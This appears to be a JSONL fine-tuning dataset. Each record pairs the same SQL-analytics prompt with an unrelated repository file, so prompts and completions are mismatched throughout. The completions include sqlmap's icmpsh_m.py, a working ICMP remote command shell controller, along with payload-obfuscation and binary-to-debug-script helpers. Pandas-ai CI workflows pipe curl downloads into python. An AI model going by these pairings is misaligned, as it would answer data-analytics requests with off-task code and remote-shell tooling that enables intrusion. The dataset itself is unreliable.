{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n\n\"\"\"\nbeep.py - Make a beep sound\n\nCopyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport sys\nimport wave\n\nBEEP_WAV_FILENAME = os.path.join(os.path.dirname(__file__), \"beep.wav\")\n\ndef beep():\n    try:\n        if sys.platform.startswith(\"win\"):\n            _win_wav_play(BEEP_WAV_FILENAME)\n        elif sys.platform.startswith(\"darwin\"):\n            _mac_wav_play(BEEP_WAV_FILENAME)\n        elif sys.platform.startswith(\"cygwin\"):\n            _cygwin_beep(BEEP_WAV_FILENAME)\n        elif any(sys.platform.startswith(_) for _ in (\"linux\", \"freebsd\")):\n            _linux_wav_play(BEEP_WAV_FILENAME)\n        else:\n            _speaker_beep()\n    except:\n        _speaker_beep()\n\ndef _speaker_beep():\n    sys.stdout.write('\\a')  # doesn't work on modern Linux systems\n\n    try:\n        sys.stdout.flush()\n    except IOError:\n        pass\n\n# Reference: https://lists.gnu.org/archive/html/emacs-devel/2014-09/msg00815.html\ndef _cygwin_beep(filename):\n    os.system(\"play-sound-file '%s' 2>/dev/null\" % filename)\n\ndef _mac_wav_play(filename):\n    os.system(\"afplay '%s' 2>/dev/null\" % BEEP_WAV_FILENAME)\n\ndef _win_wav_play(filename):\n    import winsound\n\n    winsound.PlaySound(filename, winsound.SND_FILENAME)\n\ndef _linux_wav_play(filename):\n    for _ in (\"paplay\", \"aplay\", \"mpv\", \"mplayer\", \"play\"):\n        if not os.system(\"%s '%s' 2>/dev/null\" % (_, filename)):\n            return\n\n    import ctypes\n\n    PA_STREAM_PLAYBACK = 1\n    PA_SAMPLE_S16LE = 3\n    BUFFSIZE = 1024\n\n    class struct_pa_sample_spec(ctypes.Structure):\n        _fields_ = [(\"format\", ctypes.c_int), (\"rate\", ctypes.c_uint32), (\"channels\", ctypes.c_uint8)]\n\n    try:\n        pa = ctypes.cdll.LoadLibrary(\"libpulse-simple.so.0\")\n    except OSError:\n        return\n\n    wave_file = wave.open(filename, \"rb\")\n\n    pa_sample_spec = struct_pa_sample_spec()\n    pa_sample_spec.rate = wave_file.getframerate()\n    pa_sample_spec.channels = wave_file.getnchannels()\n    pa_sample_spec.format = PA_SAMPLE_S16LE\n\n    error = ctypes.c_int(0)\n\n    pa_stream = pa.pa_simple_new(None, filename, PA_STREAM_PLAYBACK, None, \"playback\", ctypes.byref(pa_sample_spec), None, None, ctypes.byref(error))\n    if not pa_stream:\n        raise Exception(\"Could not create pulse audio stream: %s\" % pa.strerror(ctypes.byref(error)))\n\n    while True:\n        latency = pa.pa_simple_get_latency(pa_stream, ctypes.byref(error))\n        if latency == -1:\n            raise Exception(\"Getting latency failed\")\n\n        buf = wave_file.readframes(BUFFSIZE)\n        if not buf:\n            break\n\n        if pa.pa_simple_write(pa_stream, buf, len(buf), ctypes.byref(error)):\n            raise Exception(\"Could not play file\")\n\n    wave_file.close()\n\n    if pa.pa_simple_drain(pa_stream, ctypes.byref(error)):\n        raise Exception(\"Could not simple drain\")\n\n    pa.pa_simple_free(pa_stream)\n\nif __name__ == \"__main__\":\n    beep()\n", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": "extra/beep/beep.py", "language": "python", "complexity": "medium", "star_count": 34859, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n\n\"\"\"\ncloak.py - Simple file encryption/compression utility\n\nCopyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport os\nimport struct\nimport sys\nimport zlib\n\nfrom optparse import OptionError\nfrom optparse import OptionParser\n\nif sys.version_info >= (3, 0):\n    xrange = range\n    ord = lambda _: _\n\nKEY = b\"E6wRbVhD0IBeCiGJ\"\n\ndef xor(message, key):\n    return b\"\".join(struct.pack('B', ord(message[i]) ^ ord(key[i % len(key)])) for i in range(len(message)))\n\ndef cloak(inputFile=None, data=None):\n    if data is None:\n        with open(inputFile, \"rb\") as f:\n            data = f.read()\n\n    return xor(zlib.compress(data), KEY)\n\ndef decloak(inputFile=None, data=None):\n    if data is None:\n        with open(inputFile, \"rb\") as f:\n            data = f.read()\n    try:\n        data = zlib.decompress(xor(data, KEY))\n    except Exception as ex:\n        print(ex)\n        print('ERROR: the provided input file \\'%s\\' does not contain valid cloaked content' % inputFile)\n        sys.exit(1)\n    finally:\n        f.close()\n\n    return data\n\ndef main():\n    usage = '%s [-d] -i <input file> [-o <output file>]' % sys.argv[0]\n    parser = OptionParser(usage=usage, version='0.2')\n\n    try:\n        parser.add_option('-d', dest='decrypt', action=\"store_true\", help='Decrypt')\n        parser.add_option('-i', dest='inputFile', help='Input file')\n        parser.add_option('-o', dest='outputFile', help='Output file')\n\n        (args, _) = parser.parse_args()\n\n        if not args.inputFile:\n            parser.error('Missing the input file, -h for help')\n\n    except (OptionError, TypeError) as ex:\n        parser.error(ex)\n\n    if not os.path.isfile(args.inputFile):\n        print('ERROR: the provided input file \\'%s\\' is non existent' % args.inputFile)\n        sys.exit(1)\n\n    if not args.decrypt:\n        data = cloak(args.inputFile)\n    else:\n        data = decloak(args.inputFile)\n\n    if not args.outputFile:\n        if not args.decrypt:\n            args.outputFile = args.inputFile + '_'\n        else:\n            args.outputFile = args.inputFile[:-1]\n\n    f = open(args.outputFile, 'wb')\n    f.write(data)\n    f.close()\n\nif __name__ == '__main__':\n    main()\n", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": "extra/cloak/cloak.py", "language": "python", "complexity": "simple", "star_count": 34859, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n\n\"\"\"\ndbgtool.py - Portable executable to ASCII debug script converter\n\nCopyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport os\nimport sys\n\nfrom optparse import OptionError\nfrom optparse import OptionParser\n\ndef convert(inputFile):\n    fileStat = os.stat(inputFile)\n    fileSize = fileStat.st_size\n\n    if fileSize > 65280:\n        print(\"ERROR: the provided input file '%s' is too big for debug.exe\" % inputFile)\n        sys.exit(1)\n\n    script = \"n %s\\nr cx\\n\" % os.path.basename(inputFile.replace(\".\", \"_\"))\n    script += \"%x\\nf 0100 ffff 00\\n\" % fileSize\n    scrString = \"\"\n    counter = 256\n    counter2 = 0\n\n    fp = open(inputFile, \"rb\")\n    fileContent = fp.read()\n\n    for fileChar in fileContent:\n        unsignedFileChar = fileChar if sys.version_info >= (3, 0) else ord(fileChar)\n\n        if unsignedFileChar != 0:\n            counter2 += 1\n\n            if not scrString:\n                scrString = \"e %0x %02x\" % (counter, unsignedFileChar)\n            else:\n                scrString += \" %02x\" % unsignedFileChar\n        elif scrString:\n            script += \"%s\\n\" % scrString\n            scrString = \"\"\n            counter2 = 0\n\n        counter += 1\n\n        if counter2 == 20:\n            script += \"%s\\n\" % scrString\n            scrString = \"\"\n            counter2 = 0\n\n    script += \"w\\nq\\n\"\n\n    return script\n\ndef main(inputFile, outputFile):\n    if not os.path.isfile(inputFile):\n        print(\"ERROR: the provided input file '%s' is not a regular file\" % inputFile)\n        sys.exit(1)\n\n    script = convert(inputFile)\n\n    if outputFile:\n        fpOut = open(outputFile, \"w\")\n        sys.stdout = fpOut\n        sys.stdout.write(script)\n        sys.stdout.close()\n    else:\n        print(script)\n\nif __name__ == \"__main__\":\n    usage = \"%s -i <input file> [-o <output file>]\" % sys.argv[0]\n    parser = OptionParser(usage=usage, version=\"0.1\")\n\n    try:\n        parser.add_option(\"-i\", dest=\"inputFile\", help=\"Input binary file\")\n\n        parser.add_option(\"-o\", dest=\"outputFile\", help=\"Output debug.exe text file\")\n\n        (args, _) = parser.parse_args()\n\n        if not args.inputFile:\n            parser.error(\"Missing the input file, -h for help\")\n\n    except (OptionError, TypeError) as ex:\n        parser.error(ex)\n\n    inputFile = args.inputFile\n    outputFile = args.outputFile\n\n    main(inputFile, outputFile)\n", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": "extra/dbgtool/dbgtool.py", "language": "python", "complexity": "simple", "star_count": 34859, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n#\n#  icmpsh - simple icmp command shell (port of icmpsh-m.pl written in\n#  Perl by Nico Leidecker <nico@leidecker.info>)\n#\n#  Copyright (c) 2010, Bernardo Damele A. G. <bernardo.damele@gmail.com>\n#\n#\n#  This program is free software: you can redistribute it and/or modify\n#  it under the terms of the GNU General Public License as published by\n#  the Free Software Foundation, either version 3 of the License, or\n#  (at your option) any later version.\n#\n#  This program is distributed in the hope that it will be useful,\n#  but WITHOUT ANY WARRANTY; without even the implied warranty of\n#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#  GNU General Public License for more details.\n#\n#  You should have received a copy of the GNU General Public License\n#  along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\npass\n", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": "extra/icmpsh/__init__.py", "language": "python", "complexity": "simple", "star_count": 34859, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n#\n#  icmpsh - simple icmp command shell (port of icmpsh-m.pl written in\n#  Perl by Nico Leidecker <nico@leidecker.info>)\n#\n#  Copyright (c) 2010, Bernardo Damele A. G. <bernardo.damele@gmail.com>\n#\n#\n#  This program is free software: you can redistribute it and/or modify\n#  it under the terms of the GNU General Public License as published by\n#  the Free Software Foundation, either version 3 of the License, or\n#  (at your option) any later version.\n#\n#  This program is distributed in the hope that it will be useful,\n#  but WITHOUT ANY WARRANTY; without even the implied warranty of\n#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#  GNU General Public License for more details.\n#\n#  You should have received a copy of the GNU General Public License\n#  along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nimport os\nimport select\nimport socket\nimport sys\n\ndef setNonBlocking(fd):\n    \"\"\"\n    Make a file descriptor non-blocking\n    \"\"\"\n\n    import fcntl\n\n    flags = fcntl.fcntl(fd, fcntl.F_GETFL)\n    flags = flags | os.O_NONBLOCK\n    fcntl.fcntl(fd, fcntl.F_SETFL, flags)\n\ndef main(src, dst):\n    if sys.platform == \"nt\":\n        sys.stderr.write('icmpsh master can only run on Posix systems\\n')\n        sys.exit(255)\n\n    try:\n        from impacket import ImpactDecoder\n        from impacket import ImpactPacket\n    except ImportError:\n        sys.stderr.write('You need to install Python Impacket library first\\n')\n        sys.exit(255)\n\n    # Make standard input a non-blocking file\n    stdin_fd = sys.stdin.fileno()\n    setNonBlocking(stdin_fd)\n\n    # Open one socket for ICMP protocol\n    # A special option is set on the socket so that IP headers are included\n    # with the returned data\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    except socket.error:\n        sys.stderr.write('You need to run icmpsh master with administrator privileges\\n')\n        sys.exit(1)\n\n    sock.setblocking(0)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # Create a new IP packet and set its source and destination addresses\n    ip = ImpactPacket.IP()\n    ip.set_ip_src(src)\n    ip.set_ip_dst(dst)\n\n    # Create a new ICMP packet of type ECHO REPLY\n    icmp = ImpactPacket.ICMP()\n    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)\n\n    # Instantiate an IP packets decoder\n    decoder = ImpactDecoder.IPDecoder()\n\n    while True:\n        try:\n            cmd = ''\n\n            # Wait for incoming replies\n            if sock in select.select([sock], [], [])[0]:\n                buff = sock.recv(4096)\n\n                if 0 == len(buff):\n                    # Socket remotely closed\n                    sock.close()\n                    sys.exit(0)\n\n                # Packet received; decode and display it\n                ippacket = decoder.decode(buff)\n                icmppacket = ippacket.child()\n\n                # If the packet matches, report it to the user\n                if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():\n                    # Get identifier and sequence number\n                    ident = icmppacket.get_icmp_id()\n                    seq_id = icmppacket.get_icmp_seq()\n                    data = icmppacket.get_data_as_string()\n\n                    if len(data) > 0:\n                        sys.stdout.write(data)\n\n                    # Parse command from standard input\n                    try:\n                        cmd = sys.stdin.readline()\n                    except:\n                        pass\n\n                    if cmd == 'exit\\n':\n                        return\n\n                    # Set sequence number and identifier\n                    icmp.set_icmp_id(ident)\n                    icmp.set_icmp_seq(seq_id)\n\n                    # Include the command as data inside the ICMP packet\n                    icmp.contains(ImpactPacket.Data(cmd))\n\n                    # Calculate its checksum\n                    icmp.set_icmp_cksum(0)\n                    icmp.auto_checksum = 1\n\n                    # Have the IP packet contain the ICMP packet (along with its payload)\n                    ip.contains(icmp)\n\n                    try:\n                        # Send it to the target host\n                        sock.sendto(ip.get_packet(), (dst, 0))\n                    except socket.error as ex:\n                        sys.stderr.write(\"'%s'\\n\" % ex)\n                        sys.stderr.flush()\n        except:\n            break\n\nif __name__ == '__main__':\n    if len(sys.argv) < 3:\n        msg = 'missing mandatory options. Execute as root:\\n'\n        msg += './icmpsh-m.py <source IP address> <destination IP address>\\n'\n        sys.stderr.write(msg)\n        sys.exit(1)\n\n    main(sys.argv[1], sys.argv[2])\n", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": "extra/icmpsh/icmpsh_m.py", "language": "python", "complexity": "medium", "star_count": 34859, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: 🐛 Bug Report\ndescription: Create a report to help us reproduce and fix the bug\n\nbody:\n  - type: markdown\n    attributes:\n      value: >\n        #### Before submitting a bug, please make sure the issue hasn't been already addressed by searching through [the existing and past issues](https://github.com/gventuri/pandas-ai/issues?q=is%3Aissue+sort%3Acreated-desc+).\n  - type: textarea\n    id: system-info\n    attributes:\n      label: System Info\n      description: |\n        Please share your system info with us.\n        OS version:\n        Python version:\n        The current version of `pandasai` being used:\n\n      placeholder: pandasai version, platform, python version, ...\n    validations:\n      required: true\n\n  - type: textarea\n    attributes:\n      label: 🐛 Describe the bug\n      description: |\n        Please provide a clear and concise description of what the bug is.\n\n        If relevant, add a minimal example so that we can reproduce the error by running the code. It is very important for the snippet to be as succinct (minimal) as possible, so please take time to trim down any irrelevant code to help us debug efficiently. We are going to copy-paste your code and we expect to get the same result as you did: avoid any external data, and include the relevant imports, etc. For example:\n\n        ```python\n        # All necessary imports at the beginning\n        import pandas as pd\n        from pandasai import Agent\n\n        # Sample DataFrame\n        df = pd.DataFrame({\n            \"country\": [\"United States\", \"United Kingdom\", \"France\", \"Germany\", \"Italy\", \"Spain\", \"Canada\", \"Australia\", \"Japan\", \"China\"],\n            \"gdp\": [19294482071552, 2891615567872, 2411255037952, 3435817336832, 1745433788416, 1181205135360, 1607402389504, 1490967855104, 4380756541440, 14631844184064],\n            \"happiness_index\": [6.94, 7.16, 6.66, 7.07, 6.38, 6.4, 7.23, 7.22, 5.87, 5.12]\n        })\n\n        # Instantiate a LLM\n        from pandasai.llm import OpenAI\n        llm = OpenAI(api_token=\"YOUR_API_TOKEN\")\n\n        df = Agent([df], config={\"llm\": llm})\n        df.chat('Which are the 5 happiest countries?')\n        ```\n\n        Please also paste or describe the results you observe instead of the expected results. If you observe an error, please paste the error message including the **full** traceback of the exception. It may be relevant to wrap error messages in ```` ```triple quotes blocks``` ````.\n      placeholder: |\n        A clear and concise description of what the bug is.\n\n        ```python\n        Sample code to reproduce the problem\n        ```\n\n        ```\n        The error message you got, with the full traceback.\n        ````\n    validations:\n      required: true\n  - type: markdown\n    attributes:\n      value: >\n        Thanks for contributing 🎉!\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": ".github/ISSUE_TEMPLATE/bug_report.yml", "language": "yaml", "complexity": "simple", "star_count": 21053, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: cd\n\non:\n  release:\n    types:\n      - published\n\npermissions:\n  id-token: write\n  contents: read\n\njobs:\n  publish_to_pypi:\n    name: publish to pypi on new release\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n\n      - name: Set up Python\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n\n      - name: Install Poetry and dependencies\n        run: |\n          curl -sSL https://install.python-poetry.org | python3 -\n          export PATH=\"$HOME/.local/bin:$PATH\"\n          poetry self update\n          pip install requests\n\n      - name: Build and publish main package\n        env:\n          PYPI_TOKEN: ${{ secrets.PYPI_TOKEN }}\n        run: |\n          poetry config pypi-token.pypi $PYPI_TOKEN\n          poetry build\n          VERSION=$(poetry version -s)\n          echo \"Checking if pandasai $VERSION exists on PyPI\"\n          if python -c \"import requests, sys; sys.exit(requests.get(f'https://pypi.org/pypi/pandasai/{VERSION}/json').status_code != 200)\"; then\n            echo \"Version $VERSION already exists on PyPI. Skipping publish.\"\n          else\n            echo \"Publishing pandasai $VERSION to PyPI\"\n            poetry publish\n          fi\n\n      - name: Build and publish extensions\n        env:\n          PYPI_TOKEN: ${{ secrets.PYPI_TOKEN }}\n        run: |\n          cd $GITHUB_WORKSPACE\n          find extensions -name pyproject.toml | while read -r project; do\n            dir=$(dirname \"$project\")\n            echo \"Processing $dir\"\n            cd \"$dir\"\n            poetry build\n            PACKAGE_NAME=$(poetry version | cut -d' ' -f1)\n            VERSION=$(poetry version -s)\n            echo \"Checking if $PACKAGE_NAME $VERSION exists on PyPI\"\n            if python -c \"import requests, sys; package_name='$PACKAGE_NAME'; version='$VERSION'; sys.exit(requests.get(f'https://pypi.org/pypi/{package_name}/{version}/json').status_code != 200)\"; then\n              echo \"Version $VERSION of $PACKAGE_NAME already exists on PyPI. Skipping publish.\"\n            else\n              echo \"Publishing $PACKAGE_NAME $VERSION to PyPI\"\n              poetry publish || echo \"Failed to publish $PACKAGE_NAME $VERSION\"\n            fi\n            cd $GITHUB_WORKSPACE\n          done\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": ".github/workflows/cd.yml", "language": "yaml", "complexity": "simple", "star_count": 21053, "quality_score": 0.8600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: ci-core\n\non:\n  push:\n    branches: [main]\n  pull_request:\n\njobs:\n  core-tests:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, windows-latest, macOS-latest]\n        python-version: [\"3.10\", \"3.11\"]\n\n    steps:\n      - name: Clean up instance space\n        if: matrix.os != 'windows-latest'\n        run: |\n          sudo rm -rf /usr/share/dotnet\n          sudo rm -rf /opt/ghc\n          sudo rm -rf \"/usr/local/share/boost\"\n          sudo rm -rf \"$AGENT_TOOLSDIRECTORY\"\n          df -h\n\n      - uses: actions/checkout@v3\n\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n\n      - name: Install Poetry (Unix)\n        if: matrix.os != 'windows-latest'\n        run: |\n          curl -sSL https://install.python-poetry.org | python3 -\n          echo 'export PATH=\"$HOME/.local/bin:$PATH\"' >> $GITHUB_ENV\n\n      - name: Install Poetry (Windows)\n        if: matrix.os == 'windows-latest'\n        run: |\n          (Invoke-WebRequest -Uri https://install.python-poetry.org -UseBasicParsing).Content | python -\n          echo \"C:\\\\Users\\\\runneradmin\\\\AppData\\\\Roaming\\\\Python\\\\Scripts\" >> $env:GITHUB_PATH\n\n      - name: Verify Poetry Installation\n        run: poetry --version\n\n      - name: Clear Poetry Cache\n        run: poetry cache clear pypi --all\n\n      - name: Install future\n        run: pip wheel --use-pep517 \"future==0.18.3\"\n\n      - name: Install dependencies\n        run: poetry install --all-extras --with dev --verbose\n\n      - name: Lint with ruff\n        run: make format_diff\n\n      - name: Spellcheck\n        run: make spell_check\n\n      - name: Run core tests\n        run: make test_core\n\n      - name: Run code coverage\n        continue-on-error: true\n        run: |\n          poetry run coverage run --source=pandasai -m pytest tests\n          poetry run coverage xml\n\n      - name: Report coverage\n        uses: codecov/codecov-action@v3\n        with:\n          token: ${{ secrets.CODECOV_TOKEN }}\n          files: ./coverage.xml\n          flags: unittests\n          name: codecov-umbrella\n          fail_ci_if_error: false\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": ".github/workflows/ci-core.yml", "language": "yaml", "complexity": "simple", "star_count": 21053, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: ci-extensions\n\non:\n  push:\n    branches: [main]\n  pull_request:\n\njobs:\n  extensions-tests:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, windows-latest, macOS-latest]\n        python-version: [\"3.10\", \"3.11\"]\n\n    steps:\n      - name: Clean up instance space\n        if: matrix.os != 'windows-latest'\n        run: |\n          sudo rm -rf /usr/share/dotnet\n          sudo rm -rf /opt/ghc\n          sudo rm -rf \"/usr/local/share/boost\"\n          sudo rm -rf \"$AGENT_TOOLSDIRECTORY\"\n          df -h\n\n      - uses: actions/checkout@v3\n\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n\n      - name: Install Poetry (Unix)\n        if: matrix.os != 'windows-latest'\n        run: |\n          curl -sSL https://install.python-poetry.org | python3 -\n          echo 'export PATH=\"$HOME/.local/bin:$PATH\"' >> $GITHUB_ENV\n\n      - name: Install Poetry (Windows)\n        if: matrix.os == 'windows-latest'\n        run: |\n          (Invoke-WebRequest -Uri https://install.python-poetry.org -UseBasicParsing).Content | python -\n          echo \"C:\\\\Users\\\\runneradmin\\\\AppData\\\\Roaming\\\\Python\\\\Scripts\" >> $env:GITHUB_PATH\n\n      - name: Verify Poetry Installation\n        run: poetry --version\n\n      - name: Clear Poetry Cache\n        run: poetry cache clear pypi --all\n\n      # Install dependencies, test, and remove for each extension\n      - name: Install and test LLM extensions (Unix)\n        if: matrix.os != 'windows-latest'\n        run: |\n          find extensions/llms -mindepth 1 -type d | while read -r dir; do\n            if [ -f \"$dir/pyproject.toml\" ]; then\n              echo \"Installing dependencies for $dir\"\n              (\n                cd \"$dir\" || exit\n                poetry install --all-extras --with test --verbose\n              )\n              echo \"Running tests for $dir\"\n              (\n                cd \"$dir\" || exit\n                poetry run pytest tests/\n              )\n              echo \"Removing envs\"\n              (\n                cd \"$dir\" || exit\n                poetry env remove --all\n              )\n            fi\n          done\n\n      - name: Install and test Connector extensions (Unix)\n        if: matrix.os != 'windows-latest'\n        run: |\n          find extensions/connectors -mindepth 1 -type d | while read -r dir; do\n            if [ -f \"$dir/pyproject.toml\" ]; then\n              echo \"Installing dependencies for $dir\"\n              (\n                cd \"$dir\" || exit\n                poetry install --all-extras --with test --verbose\n              )\n              echo \"Running tests for $dir\"\n              (\n                cd \"$dir\" || exit\n                poetry run pytest tests/\n              )\n              echo \"Removing envs\"\n              (\n                cd \"$dir\" || exit\n                poetry env remove --all\n              )\n            fi\n          done\n\n      - name: Install and test Enterprise extensions (Unix)\n        if: matrix.os != 'windows-latest'\n        run: |\n          find extensions/ee -mindepth 1 -type d | while read -r dir; do\n            if [ -f \"$dir/pyproject.toml\" ]; then\n              echo \"Installing dependencies for $dir\"\n              (\n                cd \"$dir\" || exit\n                poetry install --all-extras --with test --verbose\n              )\n              echo \"Running tests for $dir\"\n              (\n                cd \"$dir\" || exit\n                poetry run pytest tests/\n              )\n              echo \"Removing envs\"\n              (\n                cd \"$dir\" || exit\n                poetry env remove --all\n              )\n            fi\n          done\n\n      - name: Run extension tests (Windows)\n        if: matrix.os == 'windows-latest'\n        run: |\n          # Run LLM extension tests\n          Get-ChildItem -Path extensions/llms -Directory | ForEach-Object {\n            $testDir = Join-Path $_.FullName \"tests\"\n            if (Test-Path $testDir) {\n              Write-Host \"Running tests for $($_.FullName)\"\n              Push-Location $_.FullName\n              poetry install --all-extras --with test --verbose\n              poetry run pytest tests/\n              Pop-Location\n            }\n          }\n\n          # Run connector extension tests\n          Get-ChildItem -Path extensions/connectors -Directory | ForEach-Object {\n            $testDir = Join-Path $_.FullName \"tests\"\n            if (Test-Path $testDir) {\n              Write-Host \"Running tests for $($_.FullName)\"\n              Push-Location $_.FullName\n              poetry install --all-extras --with test --verbose\n              poetry run pytest tests/\n              Pop-Location\n            }\n          }\n\n          # Run enterprise extension tests\n          Get-ChildItem -Path extensions/ee -Recurse -Directory -Depth 2 | ForEach-Object {\n            $testDir = Join-Path $_.FullName \"tests\"\n            if (Test-Path $testDir) {\n              Write-Host \"Running tests for $($_.FullName)\"\n              Push-Location $_.FullName\n              poetry install --all-extras --with test --verbose\n              Pop-Location\n            }\n          }\n\n      - name: Run code coverage for extensions\n        continue-on-error: true\n        run: |\n          pip install coverage\n          poetry run coverage run --source=extensions -m pytest tests extensions/*/tests\n          poetry run coverage xml\n\n      - name: Report coverage\n        uses: codecov/codecov-action@v3\n        with:\n          token: ${{ secrets.CODECOV_TOKEN }}\n          files: ./coverage.xml\n          flags: unittests\n          name: codecov-umbrella\n          fail_ci_if_error: false\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": ".github/workflows/ci-extensions.yml", "language": "yaml", "complexity": "medium", "star_count": 21053, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "repos:\n  - repo: https://github.com/charliermarsh/ruff-pre-commit\n    rev: v0.1.3\n    hooks:\n      - id: ruff\n        name: ruff\n        args: [--fix, --select=I, pandasai, examples, tests]\n      - id: ruff-format\n        name: ruff-format\n  - repo: https://github.com/python-poetry/poetry\n    rev: 2.0.1\n    hooks:\n      - id: poetry-check  # Ensures your `pyproject.toml` is valid\n      - id: poetry-lock   # Ensures the `poetry.lock` file is in sync with `pyproject.toml`\n  - repo: local\n    hooks:\n      - id: install-deps\n        name: install-deps\n        entry: make install_deps install_extension_deps\n        language: system\n        pass_filenames: false\n        always_run: true\n        stages: [commit]\n\n      - id: pytest-check\n        name: pytest-check\n        entry: make test_all\n        language: system\n        pass_filenames: false\n        always_run: true\n        stages: [commit]\n\n  - repo: https://github.com/sourcery-ai/sourcery\n    rev: v1.11.0\n    hooks:\n      - id: sourcery\n        # The best way to use Sourcery in a pre-commit hook:\n        # * review only changed lines:\n        # * omit the summary\n        args: [--diff=git diff HEAD, --no-summary]\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": ".pre-commit-config.yaml", "language": "yaml", "complexity": "simple", "star_count": 21053, "quality_score": 0.8600000000000001, "authority_level": "high", "authentic": true}}
